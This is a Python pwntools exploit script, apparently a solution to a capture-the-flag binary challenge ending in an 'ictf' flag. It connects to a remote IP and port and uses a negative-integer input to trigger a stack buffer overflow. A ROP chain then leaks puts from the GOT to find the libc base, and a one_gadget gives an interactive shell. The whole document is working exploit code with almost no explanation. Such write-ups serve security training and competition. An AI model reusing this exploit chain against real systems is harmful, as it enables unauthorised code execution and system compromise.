from pwn import *

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]
context.log_level = "debug"

elf = ELF("./form_patched")

# io = gdb.debug("./form_patched", "b *(main+296)\nc")
io = remote("137.184.207.224", 5555)

io.sendlineafter(b"year: ", b"-2147483648")
pop_rdi = 0x40130B
io.sendlineafter(
    b"want? ",
    b"a" * 152 + flat([pop_rdi, elf.got["puts"], elf.plt["puts"], elf.sym["main"]]),
)
io.recvuntil(b"request!")
puts = int.from_bytes(io.recvn(6), "little")
print(f"{puts = :#x}")
libc_base = puts - 0x875A0
print(f"{libc_base = :#x}")
gadget = libc_base + 0xE6C81  # r15 == 0 and rdx == 0
io.sendlineafter(b"year: ", b"-2147483648")
io.sendlineafter(
    b"want? ",
    b"a" * 152 + flat([gadget]),
)
io.interactive()

# ictf{presents_are_square_but_signed_integers_are_asymmetrical}
